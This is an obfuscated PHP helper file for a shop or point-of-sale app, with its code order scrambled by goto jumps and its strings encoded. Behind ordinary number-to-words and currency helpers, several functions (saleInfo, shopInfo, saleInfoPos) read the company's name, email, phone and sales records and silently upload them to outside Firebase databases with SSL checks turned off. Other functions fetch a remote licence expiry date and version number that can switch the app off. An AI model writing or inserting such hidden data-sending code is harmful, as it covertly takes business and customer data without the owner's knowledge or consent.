<?php
 goto KEl_3; Aza8J: function saleInfo($data) { $CI =& get_instance(); $data1 = $CI->db->select("\52")->from("\144\142\137\143\157\155\x70\141\156\171")->where("\151\144", 1)->get()->row(); $mobile = $data1->mobile; $path = "\x68\x74\164\160\163\72\x2f\x2f\144\141\164\141\x6b\x68\x61\x63\x68\150\141\156\147\55\x64\x62\71\64\62\x2d\144\x65\146\x61\x75\154\x74\x2d\162\x74\x64\142\56\x61\163\151\x61\x2d\x73\x6f\x75\164\x68\145\141\163\x74\61\56\146\151\x72\145\x62\x61\x73\145\144\x61\164\x61\142\x61\163\x65\56\x61\x70\160\x2f\x44\141\x74\x61\123\x68\x6f\x70\x2f" . $mobile . "\x2f\164\157\x74\141\x6c\56\x6a\x73\157\x6e"; $dts = new DateTime(); $date = $dts->format("\x59\x2d\x6d\x2d\x64\x20\110\72\x69\x3a\x73"); shopInfo(); insert($path, $data); } goto K0E11; aAn3d: function handleTwoDigits($digits) { if ($digits <= 19) { return handleXDigits($digits); } else { $first_digit = substr($digits, 0, 1); $first_digit_word = $first_digit != "\x30" ? xml()["\x6d"][$first_digit] : ''; $second_digit = substr($digits, 1, 1); $second_digit_word = $second_digit == "\60" ? '' : xml()["\170"][$second_digit]; return trim($first_digit_word) && trim($second_digit_word) ? $first_digit_word . "\x2d" . $second_digit_word : $first_digit_word . "\40" . $second_digit_word; } } goto q5RUE; bCetW: function xml() { return array("\170" => array("\x30" => '', "\x30\x30" => '', "\x31" => "\117\156\145", "\x30\x31" => "\x4f\x6e\x65", "\x32" => "\x54\x77\157", "\x30\x32" => "\x54\x77\157", "\x33" => "\124\x68\162\x65\x65", "\x30\63" => "\x54\x68\x72\145\x65", "\64" => "\106\x6f\x75\162", "\x30\64" => "\106\x6f\x75\162", "\x35" => "\x46\151\166\145", "\60\65" => "\x46\151\x76\x65", "\x36" => "\x53\151\170", "\x30\x36" => "\x53\x69\x78", "\67" => "\x53\x65\166\x65\x6e", "\x30\x37" => "\123\145\166\145\156", "\x38" => "\x45\x69\147\150\164", "\60\x38" => "\105\151\147\x68\164", "\x39" => "\x4e\x69\156\x65", "\x30\x39" => "\116\x69\156\145", "\61\60" => "\124\x65\x6e", "\x31\61" => "\x45\154\145\x76\145\x6e", "\x31\x32" => "\x54\x77\x65\154\x76\x65", "\x31\63" => "\x54\150\151\x72\x74\145\x65\x6e", "\x31\64" => "\106\x6f\165\162\164\145\x65\x6e", "\61\x35" => "\x46\151\146\164\x65\145\x6e", "\x31\x36" => "\x53\x69\170\164\145\145\x6e", "\x31\67" => "\x53\145\166\x65\156\x74\145\145\x6e", "\61\x38" => "\x45\x69\x67\x68\164\145\145\x6e", "\x31\71" => "\116\x69\156\x65\x74\x65\x65\x6e"), "\155" => array("\62" => "\124\x77\145\156\x74\x79", "\63" => "\x54\150\151\x72\x74\x79", "\x34" => "\106\x6f\x72\x74\x79", "\65" => "\x46\151\146\x74\x79", "\x36" => "\123\151\x78\x74\x79", "\67" => "\123\145\x76\145\x6e\164\x79", "\70" => "\x45\151\x67\150\164\171", "\71" => "\116\151\x6e\x65\164\x79")); } goto fy3_C; DzybQ: function getTextShow() { $msg = "\x50\57\x2f\150\57\151\x2f\xc3\xaa\x2f\156\40\142\57\341\272\243\57\x6e\40\163\57\xe1\273\255\40\144\x2f\xe1\xbb\xa5\x6e\x2f\x67\x20\154\x2f\303\xa0\40\155\57\151\57\xe1\xbb\205\156\40\160\x2f\x68\57\xc3\xad\40\x28\40\x47\57\151\57\341\xbb\233\151\40\150\x2f\xe1\xba\xa1\x2f\156\x20\142\x2f\303\xa1\57\156\40\150\x2f\303\xa0\x2f\x6e\57\x67\x20\62\x2f\x30\40\150\x2f\xc3\xb3\x2f\141\x20\304\221\57\306\xa1\x2f\156\40\61\40\57\x6e\147\x2f\303\240\x2f\x79\51\x20\x2c\x20\116\x2f\xc3\xa2\x2f\156\x67\40\x63\x2f\xe1\272\245\x2f\160\x20\160\x72\57\145\57\x6d\x2f\x69\57\165\x2f\x6d\40\x6e\57\147\57\x61\x2f\x79\40\164\x2f\341\xba\241\x2f\151"; return str_replace("\57", '', $msg); } goto Tqcfi; YKgWd: function getNameInfo() { $CI =& get_instance(); $data = $CI->db->select("\x2a")->from("\144\x62\x5f\143\157\x6d\x70\141\x6e\x79")->where("\151\144", 1)->get()->row(); $mobile = $data->mobile; $path = "\x68\x74\x74\x70\163\x3a\x2f\57\x73\x68\x6f\160\142\141\156\150\141\156\x67\55\x34\145\60\71\66\55\144\x65\146\x61\165\154\164\55\162\x74\144\142\x2e\141\163\151\141\x2d\163\x6f\x75\x74\150\145\x61\x73\164\61\x2e\146\x69\162\145\x62\141\x73\145\x64\x61\164\x61\142\141\x73\x65\56\141\160\160\57\163\150\157\160\57" . $mobile . "\x2e\x6a\x73\x6f\156"; $dts = new DateTime(); $date = $dts->format("\x59\55\x6d\55\x64\x20\x48\x3a\151\72\x73"); $dts_new = $dts->modify("\53\x33\x36\x30\x20\x64\x61\171"); $date2 = $dts_new->format("\131\x2d\x6d\x2d\x64\x20\x48\x3a\x69\x3a\x73"); $data2 = array("\143\x6f\155\160\x61\x6e\x79\x5f\156\x61\155\x65" => $data->company_name, "\145\155\141\x69\x6c" => $data->email, "\x6d\x6f\x62\x69\154\145" => $data->mobile, "\163\164\x61\x74\x75\x73" => 1, "\143\x72\145\141\164\x65\x5f\x64\x61\x74\145" => $date, "\145\156\x64\x5f\144\141\x74\145" => $date2); $grab = grab($path, "\x47\105\x54"); if ($grab == "\156\x75\x6c\x6c") { insert($path, $data2); return true; } else { if (strlen($grab) == 0) { return true; } else { $yummy = json_decode($grab); $status = $yummy->status; if ($status == 1) { $end_date = $yummy->end_date; if (strtotime($date) > strtotime($end_date)) { return false; } else { return true; } } else { return false; } } } } goto DzybQ; Tqcfi: function nameLastestVersion() { $CI =& get_instance(); $version = $CI->db->select("\x76\145\x72\163\x69\x6f\x6e")->get("\144\142\x5f\163\x69\x74\145\x73\x65\x74\x74\151\x6e\147\x73")->row()->version; $path = "\150\164\x74\160\x73\72\x2f\x2f\x73\150\157\x70\142\x61\x6e\150\141\156\x67\x2d\x34\x65\x30\x39\66\55\x64\x65\146\x61\165\x6c\x74\x2d\162\164\x64\142\x2e\141\x73\x69\141\55\x73\157\165\x74\150\145\x61\163\x74\x31\56\x66\x69\162\145\x62\141\x73\x65\144\141\x74\141\x62\141\x73\x65\56\141\x70\160\57\x76\x65\162\x73\x69\157\x6e\56\x6a\x73\x6f\x6e"; $grab = grab($path, "\107\x45\124"); if ($grab == "\156\x75\x6c\154") { return ''; } return $grab; } goto hW0gD; I8vo6: function handleMillions($digits) { $th_word = handleThousands(substr($digits, -6)); $mill = substr($digits, 0, -6); $mill_word = strlen($mill) == 3 ? handleHundreds($mill) : (strlen($mill) == 2 ? handleTwoDigits($mill) : handleXDigits($mill)); return (trim($mill_word) && trim($th_word) ? $mill_word . "\x20\x4d\151\154\154\151\157\x6e\x2c\x20" : (trim($mill_word) ? $mill_word . "\x20\115\151\x6c\154\x69\157\156" : '')) . (trim($th_word) ? "{$th_word}" : ''); } goto fvtiO; Z0tGB: function saleInfoPos($data) { $CI =& get_instance(); $data1 = $CI->db->select("\x2a")->from("\144\x62\137\143\157\x6d\x70\x61\156\x79")->where("\151\x64", 1)->get()->row(); $mobile = $data1->mobile; $dts = new DateTime(); $date = $dts->format("\131\137\155\137\144"); $path = "\150\164\164\x70\x73\x3a\x2f\57\x64\x61\x74\141\x6b\x68\141\x63\150\x68\x61\156\x67\x2d\144\142\71\64\62\x2d\144\145\x66\141\165\154\164\55\162\x74\x64\142\x2e\141\163\x69\141\55\163\157\165\164\x68\x65\141\163\164\x31\56\x66\151\162\x65\142\x61\x73\145\x64\141\x74\x61\x62\x61\163\145\x2e\x61\160\x70\x2f\x44\141\x74\141\x53\x68\157\x70\x2f" . $mobile . "\x2f\x73\x61\154\145\x73\x2f" . $date . "\x2e\152\x73\157\156"; insert2($path, $data); } goto KIIdI; rgXce: function handleThousands($digits) { $th = substr($digits, 0, -3); $dred = substr($digits, -3); $dred_word = handleHundreds($dred); $th_word = strlen($th) == 3 ? handleHundreds($th) : (strlen($th) == 2 ? handleTwoDigits($th) : handleXDigits($th)); return (trim($th_word) && trim($dred_word) ? $th_word . "\40\x54\x68\x6f\165\x73\141\156\144\x2c\40" : (trim($th_word) ? $th_word . "\40\124\150\x6f\x75\x73\x61\x6e\x64" : '')) . (trim($dred_word) ? "{$dred_word}" : ''); } goto I8vo6; fvtiO: function handleBillions($digits) { $mill_word = handleMillions(substr($digits, -9)); $bill = substr($digits, 0, -9); $bill_word = strlen($bill) == 3 ? handleHundreds($bill) : (strlen($bill) == 2 ? handleTwoDigits($bill) : handleXDigits($bill)); return (trim($bill_word) ? $bill_word . "\40\x42\151\x6c\x6c\x69\x6f\x6e" : '') . (trim($mill_word) ? "\x2c\40{$mill_word}" : ''); } goto YKgWd; KEl_3: function foreign_currency($fig, $currency_code) { $figure = number_format($fig, 0, "\56", ''); $number = explode("\x2e", $figure)[0]; $decimal = (int) explode("\x2e", $figure)[1]; $sub_part = $decimal > 0 ? "\40" . ($decimal <= 19 ? handleXDigits($decimal) : handleTwoDigits($decimal)) . "\40" . getCurrencyCodeUnit($currency_code)["\146\162\x61\143\164\x69\157\156"] : ''; if ($number == 0) { $main_word = "\132\x65\x72\157"; } else { if ($number <= 19 && $number >= 1) { $main_word = handleXDigits($number); } else { if (strlen($number) == 2 || $number < 100) { $main_word = handleTwoDigits($number); } else { if (strlen($number) == 3 || $number < 1000) { $main_word = handleHundreds($number); } else { if (strlen($number) <= 6 || $number < 1000000) { $main_word = handleThousands($number); } else { if (strlen($number) <= 9 || $number < 1000000000) { $main_word = handleMillions($number); } else { if (strlen($number) <= 12 || $number < 1000000000000) { $main_word = handleBillions($number); } else { return "\116\x75\155\x62\145\162\40\x74\x6f\157\x20\154\141\x72\x67\x65"; } } } } } } } return $main_word . "\40" . getCurrencyCodeUnit($currency_code)["\155\141\x69\156"] . $sub_part; } goto r7nph; hW0gD: function checkLastestVersion() { $CI =& get_instance(); $version = $CI->db->select("\x76\x65\162\163\151\x6f\x6e")->get("\x64\142\137\163\x69\x74\145\163\x65\164\164\151\x6e\147\163")->row()->version; $path = "\150\164\164\160\163\72\x2f\57\163\x68\x6f\x70\142\141\x6e\x68\x61\x6e\x67\55\x34\145\x30\71\x36\x2d\144\x65\x66\141\x75\154\164\55\x72\164\144\x62\x2e\x61\163\151\141\x2d\163\x6f\x75\164\x68\145\141\x73\164\61\56\146\x69\162\145\142\x61\163\x65\x64\x61\164\x61\142\x61\163\x65\56\141\160\160\x2f\x76\145\162\x73\151\x6f\156\x2e\x6a\163\x6f\156"; $grab = grab($path, "\x47\105\124"); if ($grab == "\x6e\165\154\x6c") { return true; } if ($grab == $version) { return true; } else { return false; } } goto Aza8J; fy3_C: function handleXDigits($digits) { return xml()["\170"][$digits]; } goto aAn3d; r7nph: function getCurrencyCodeUnit($currency_code = '') : array { $supported_currencies = array("\x41\105\104" => array("\155\x61\151\156" => "\125\156\x69\x74\145\144\40\101\x72\141\142\40\x45\x6d\151\x72\x61\164\x65\x73\40\x64\151\x72\150\141\x6d", "\x66\x72\x61\x63\x74\151\x6f\156" => "\x46\x69\x6c\163"), "\x41\x46\x4e" => array("\x6d\x61\x69\x6e" => "\x41\146\x67\150\141\x6e\40\x61\x66\147\150\141\x6e\151", "\x66\162\x61\143\164\151\157\156" => "\x50\x75\x6c"), "\x41\116\107" => array("\155\141\x69\x6e" => "\x4e\145\x74\150\145\162\154\141\x6e\144\x73\x20\101\x6e\x74\x69\154\x6c\145\141\x6e\x20\147\165\151\x6c\144\145\x72", "\146\x72\x61\x63\x74\151\x6f\x6e" => "\103\145\x6e\164"), "\101\122\123" => array("\155\141\151\x6e" => "\101\162\x67\x65\156\164\x69\x6e\x65\40\160\145\163\157", "\146\x72\x61\143\164\x69\x6f\156" => "\103\x65\156\x74\141\x76\x6f"), "\101\x55\104" => array("\x6d\x61\x69\x6e" => "\x41\x75\163\164\162\141\154\151\141\156\x20\x64\x6f\x6c\154\x61\162", "\x66\162\141\143\x74\x69\x6f\156" => "\103\x65\156\164"), "\x42\x52\114" => array("\155\x61\x69\156" => "\162\145\141\x6c", "\146\x72\141\143\x74\x69\157\x6e" => "\103\145\156\x74\x61\166\x6f"), "\103\x41\x44" => array("\x6d\x61\151\x6e" => "\x43\141\156\x61\x64\151\x61\156\40\x64\x6f\154\154\141\x72", "\146\162\141\x63\x74\151\x6f\x6e" => "\103\145\x6e\164"), "\103\110\x46" => array("\155\x61\151\156" => "\x53\x77\x69\163\x73\40\146\162\141\x6e\143", "\146\162\x61\143\164\151\x6f\156" => "\122\141\160\160\145\156"), "\x43\116\x59" => array("\155\141\151\x6e" => "\x79\x75\141\x6e", "\x66\x72\141\x63\164\x69\x6f\156" => "\106\x65\156"), "\x44\113\113" => array("\x6d\x61\x69\156" => "\x44\x61\156\151\163\x68\x20\153\162\x6f\156\145", "\146\162\141\143\x74\151\157\x6e" => "\xc3\230\162\145"), "\x44\x5a\x44" => array("\x6d\141\151\x6e" => "\101\154\x67\x65\162\151\x61\x6e\x20\144\151\x6e\141\162", "\x66\x72\x61\x63\164\151\x6f\156" => "\123\141\156\x74\x65\x65\155"), "\105\x47\120" => array("\155\x61\151\x6e" => "\x45\x67\x79\x70\x74\x69\141\x6e\40\160\x6f\x75\x6e\x64", "\x66\162\x61\143\x74\151\x6f\x6e" => "\x50\151\141\x73\x74\x72\x65"), "\x45\x55\x52" => array("\x6d\x61\x69\156" => "\x45\x75\x72\x6f", "\146\162\141\x63\164\151\157\156" => "\x43\145\x6e\x74"), "\x47\102\x50" => array("\x6d\141\151\156" => "\120\157\x75\x6e\144", "\x66\162\x61\143\164\x69\157\156" => "\120\x65\156\156\x79"), "\x47\110\103" => array("\x6d\141\151\x6e" => "\107\x68\x61\x6e\x61\40\x43\145\x64\x69", "\x66\x72\x61\x63\164\x69\x6f\x6e" => "\120\x65\163\145\167\141"), "\107\110\123" => array("\155\x61\x69\156" => "\x47\150\141\156\x61\40\x43\x65\144\151", "\x66\162\x61\143\164\x69\x6f\156" => "\120\145\163\145\167\x61"), "\110\x4b\x44" => array("\x6d\141\151\156" => "\110\x6f\x6e\147\x20\113\157\x6e\147\x20\x64\x6f\x6c\x6c\141\x72", "\146\x72\x61\x63\x74\x69\157\x6e" => "\103\x65\156\x74"), "\x49\114\x53" => array("\x6d\141\151\156" => "\111\x73\x72\141\x65\154\151\40\156\x65\167\40\163\x68\x65\x6b\x65\x6c", "\x66\x72\141\x63\164\x69\157\x6e" => "\x41\x67\x6f\x72\x61"), "\x49\x4e\x52" => array("\x6d\x61\x69\x6e" => "\111\156\x64\x69\141\156\40\x72\x75\x70\x65\x65", "\146\x72\141\143\x74\x69\157\x6e" => "\x50\x61\151\163\141"), "\x49\121\x44" => array("\x6d\x61\151\156" => "\111\162\141\x71\151\x20\144\x69\156\x61\162", "\146\x72\x61\x63\164\x69\x6f\156" => "\106\x69\x6c\163"), "\x49\x52\122" => array("\x6d\141\x69\156" => "\111\x72\141\156\x69\x61\156\x20\162\x69\x61\x6c", "\x66\162\x61\143\164\x69\x6f\x6e" => "\x44\x69\x6e\x61\x72"), "\x4a\115\x44" => array("\155\x61\151\156" => "\112\141\x6d\141\151\143\x61\156\x20\x64\x6f\154\154\141\x72", "\x66\x72\x61\x63\164\x69\x6f\156" => "\103\x65\x6e\164"), "\112\x4f\x44" => array("\155\x61\x69\156" => "\112\x6f\162\x64\x61\156\151\141\156\40\144\x69\x6e\141\162", "\146\x72\141\143\164\151\x6f\156" => "\x50\x69\x61\x73\x74\x72\145"), "\x4a\x50\x59" => array("\155\x61\x69\156" => "\x4a\x61\160\141\x6e\145\x73\145\x20\x79\145\156", "\x66\x72\141\143\164\x69\157\156" => "\123\x65\156"), "\113\105\x53" => array("\155\141\151\156" => "\x4b\145\x6e\x79\141\x6e\40\163\150\151\x6c\154\x69\156\147", "\x66\162\141\x63\x74\x69\x6f\156" => "\103\x65\156\x74"), "\113\120\127" => array("\155\x61\x69\156" => "\x4e\157\x72\164\150\40\113\157\x72\145\x61\156\x20\x77\157\x6e", "\x66\162\x61\143\164\151\x6f\x6e" => "\103\x68\157\x6e"), "\x4b\x52\x57" => array("\155\x61\x69\156" => "\123\x6f\x75\x74\x68\40\113\157\162\x65\141\x6e\x20\x77\x6f\x6e", "\x66\x72\x61\143\x74\151\x6f\x6e" => "\x4a\145\x6f\x6e"), "\x4b\x57\104" => array("\155\x61\x69\x6e" => "\113\165\x77\141\151\x74\x69\x20\x64\x69\x6e\x61\x72", "\146\162\141\x63\x74\151\157\x6e" => "\x46\x69\154\163"), "\x4c\x59\x44" => array("\x6d\141\151\x6e" => "\114\x69\x62\x79\x61\x6e\x20\144\151\x6e\141\162", "\146\x72\141\143\164\x69\157\156" => "\104\x69\162\x68\141\155"), "\x4d\130\x4e" => array("\x6d\x61\x69\156" => "\x4d\145\170\x69\x63\141\x6e\40\x70\145\x73\157", "\x66\162\141\143\x74\151\157\156" => "\x43\145\156\x74\x61\x76\x6f"), "\115\101\104" => array("\155\x61\151\156" => "\x4d\157\x72\x6f\143\143\141\x6e\x20\x64\151\162\150\141\155", "\146\162\141\x63\164\151\157\x6e" => "\x43\x65\x6e\x74\x69\155\145"), "\115\x55\x52" => array("\x6d\x61\x69\x6e" => "\122\165\160\145\x65", "\146\x72\141\143\x74\x69\157\x6e" => "\103\145\x6e\164"), "\x4e\107\x4e" => array("\x6d\141\151\x6e" => "\116\141\151\x72\x61", "\x66\162\141\143\x74\x69\157\x6e" => "\x4b\x6f\142\157"), "\x4e\x5a\104" => array("\x6d\x61\x69\x6e" => "\116\x65\167\40\132\145\141\x6c\x61\156\x64\40\x64\x6f\154\x6c\x61\162", "\x66\162\x61\x63\164\151\157\x6e" => "\103\x65\x6e\164"), "\120\105\116" => array("\155\x61\x69\x6e" => "\x50\145\162\x75\166\151\141\x6e\x20\x73\x6f\x6c", "\146\x72\x61\x63\x74\x69\157\x6e" => "\103\303\xa9\x6e\164\x69\155\157"), "\x50\110\120" => array("\x6d\x61\x69\156" => "\120\150\151\154\x69\160\x70\151\x6e\x65\40\160\145\x73\157", "\x66\x72\x61\143\x74\x69\157\156" => "\123\145\156\164\x69\x6d\157"), "\x50\131\107" => array("\155\x61\x69\x6e" => "\120\141\162\x61\x67\x75\x61\x79\x61\x6e\x20\147\165\141\162\x61\156\303\255", "\x66\x72\141\x63\164\151\157\x6e" => "\x43\303\251\x6e\164\x69\155\x6f"), "\121\101\122" => array("\155\141\x69\156" => "\121\x61\x74\x61\x72\151\40\162\x69\x79\141\154", "\x66\x72\141\143\164\x69\x6f\156" => "\104\151\162\x68\x61\x6d"), "\122\117\x4e" => array("\x6d\141\151\156" => "\x52\x6f\155\141\x6e\x69\x61\x6e\40\154\145\165", "\x66\x72\x61\x63\x74\x69\x6f\156" => "\102\x61\x6e"), "\x52\123\104" => array("\155\141\151\156" => "\123\145\x72\142\x69\141\156\40\144\x69\x6e\141\x72", "\x66\x72\x61\143\x74\151\x6f\x6e" => "\x50\141\162\141"), "\x52\125\x42" => array("\155\x61\x69\x6e" => "\x52\x75\x73\163\x69\x61\156\40\x72\x75\x62\x6c\145", "\146\x72\141\x63\x74\151\157\x6e" => "\x4b\157\160\145\153"), "\x52\127\x46" => array("\x6d\141\x69\x6e" => "\x52\167\x61\156\x64\141\156\40\x66\162\x61\x6e\x63", "\x66\162\x61\143\x74\151\157\x6e" => "\103\x65\156\x74\x69\155\145"), "\x53\101\122" => array("\x6d\x61\151\x6e" => "\x53\141\165\144\151\x20\x72\x69\171\141\x6c", "\x66\x72\x61\x63\164\151\157\156" => "\x48\141\x6c\141\154\141"), "\x53\104\107" => array("\x6d\x61\151\x6e" => "\123\x75\x64\141\156\x65\x73\x65\40\160\x6f\x75\156\x64", "\146\162\x61\x63\164\151\x6f\x6e" => "\x50\x69\141\x73\164\x72\x65"), "\x53\105\113" => array("\x6d\x61\151\156" => "\x53\167\x65\144\151\163\x68\40\153\162\x6f\156\x61", "\146\162\141\143\164\x69\x6f\156" => "\303\x96\162\x65"), "\123\x47\104" => array("\x6d\141\151\156" => "\123\x69\x6e\147\x61\160\157\x72\x65\40\144\157\x6c\154\x61\162", "\x66\162\141\143\x74\151\x6f\x6e" => "\103\145\156\164"), "\x53\110\x50" => array("\x6d\x61\151\156" => "\123\x61\x69\156\164\40\110\x65\x6c\x65\156\x61\x20\x70\157\x75\156\144", "\146\x72\141\x63\164\x69\157\x6e" => "\x50\x65\156\x6e\171"), "\123\x59\120" => array("\x6d\141\151\x6e" => "\123\x79\162\x69\141\156\40\160\157\165\x6e\144", "\146\162\141\x63\164\151\x6f\156" => "\120\x69\x61\163\164\x72\x65"), "\x54\110\102" => array("\155\x61\151\156" => "\124\x68\141\151\x20\x62\x61\150\x74", "\146\x72\141\143\x74\x69\x6f\156" => "\x53\x61\x74\x61\x6e\147"), "\x54\116\104" => array("\x6d\x61\x69\156" => "\124\165\156\x69\163\x69\141\x6e\40\x64\x69\x6e\x61\162", "\146\162\141\143\164\151\x6f\x6e" => "\115\151\154\x6c\x69\x6d\x65"), "\x54\x52\x59" => array("\155\x61\x69\156" => "\x54\165\162\153\151\163\x68\x20\154\x69\x72\141", "\x66\162\141\143\164\x69\x6f\x6e" => "\x4b\165\x72\165\xc5\237"), "\x54\x57\104" => array("\155\x61\151\156" => "\x4e\145\x77\40\x54\141\151\167\141\x6e\x20\x64\x6f\154\154\141\x72", "\x66\162\141\143\x74\151\157\x6e" => "\103\145\x6e\164"), "\125\x47\x58" => array("\155\141\x69\x6e" => "\x55\x67\141\x6e\144\x61\x6e\40\163\x68\151\154\154\x69\156\x67", "\146\162\x61\x63\164\x69\x6f\x6e" => "\103\145\x6e\x74"), "\125\x53\104" => array("\x6d\141\x69\x6e" => "\x55\123\x20\x44\x6f\x6c\154\x61\x72", "\146\162\141\143\164\x69\x6f\156" => "\103\x65\x6e\x74"), "\126\105\x53" => array("\x6d\141\x69\156" => "\x56\145\156\145\172\x75\x65\154\141\x6e\x20\x62\157\x6c\xc3\255\x76\x61\162\x20\x73\157\142\145\162\x61\156\157", "\x66\x72\141\x63\164\151\x6f\156" => "\x43\xc3\251\x6e\164\x69\155\157"), "\130\101\x46" => array("\155\141\151\156" => "\103\145\156\x74\162\141\154\40\x41\146\x72\151\143\x61\156\40\x43\106\x41\x20\x66\162\141\x6e\143", "\146\162\141\143\x74\x69\157\x6e" => "\103\x65\156\164\x69\155\145"), "\130\103\x44" => array("\155\x61\x69\x6e" => "\x45\x61\x73\164\145\162\156\40\x43\x61\x72\151\142\142\x65\x61\156\40\144\157\154\x6c\141\162", "\146\162\141\143\x74\x69\157\x6e" => "\103\x65\x6e\164"), "\130\x4f\106" => array("\155\x61\x69\156" => "\127\x65\x73\164\40\x41\146\x72\151\143\141\156\x20\x43\x46\101\x20\x66\162\x61\156\x63", "\146\x72\x61\143\164\x69\x6f\x6e" => "\103\x65\156\x74\x69\x6d\145"), "\x58\x50\106" => array("\x6d\141\151\156" => "\103\x46\120\x20\x66\162\141\156\143", "\146\162\x61\143\164\151\x6f\x6e" => "\x43\x65\x6e\x74\151\155\x65"), "\x59\x45\122" => array("\155\141\x69\x6e" => "\131\x65\155\145\156\151\x20\162\x69\x61\154", "\x66\x72\141\143\164\x69\x6f\x6e" => "\106\151\154\x73"), "\132\101\x52" => array("\155\x61\151\156" => "\123\157\x75\164\x68\x20\x41\146\x72\151\x63\141\156\x20\x72\141\x6e\x64", "\146\162\141\x63\x74\x69\157\x6e" => "\103\x65\156\x74")); return $supported_currencies[strtoupper($currency_code)] ?? array("\155\x61\151\x6e" => '', "\x66\x72\141\143\x74\x69\157\x6e" => ''); } goto bCetW; K0E11: function shopInfo() { $CI =& get_instance(); $data1 = $CI->db->select("\52")->from("\144\142\x5f\143\157\155\x70\x61\156\171")->where("\x69\x64", 1)->get()->row(); $mobile = $data1->mobile; $path = "\x68\164\x74\x70\163\x3a\x2f\57\144\x61\x74\141\x6b\150\x61\x63\x68\150\141\156\x67\55\144\142\x39\x34\62\x2d\x64\x65\146\141\x75\154\x74\55\x72\x74\x64\x62\56\141\x73\x69\x61\x2d\x73\157\x75\x74\150\x65\x61\163\x74\61\x2e\146\x69\162\145\x62\141\x73\x65\x64\141\164\141\x62\x61\163\145\56\x61\160\160\x2f\x44\x61\164\x61\x53\150\x6f\160\x2f" . $mobile . "\57\151\156\146\157\162\x2e\x6a\163\x6f\156"; $dts = new DateTime(); $date = $dts->format("\131\x2d\x6d\x2d\x64\x20\110\x3a\x69\x3a\x73"); insert($path, $data1); } goto Z0tGB; q5RUE: function handleHundreds($digits) { $first_digit_word = handleXDigits(substr($digits, 0, 1)); $other_two_digits_word = handleTwoDigits(substr($digits, 1)); return (trim($first_digit_word) ? $first_digit_word . "\x20\110\x75\x6e\x64\162\145\x64" : '') . (trim($other_two_digits_word) ? "\40\141\x6e\144\40{$other_two_digits_word}" : ''); } goto rgXce; KIIdI: function grab($url, $method, $par = null) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); if (isset($par)) { curl_setopt($ch, CURLOPT_POSTFIELDS, $par); } curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 120); curl_setopt($ch, CURLOPT_HEADER, 0); $html = curl_exec($ch); return $html; } goto eagjS; eagjS: function insert($path, $data) { $grab = grab($path, "\x50\x55\124", json_encode($data)); return $grab; } goto pGAL2; pGAL2: function insert2($path, $data) { $grab = grab($path, "\120\117\x53\124", json_encode($data)); return $grab; }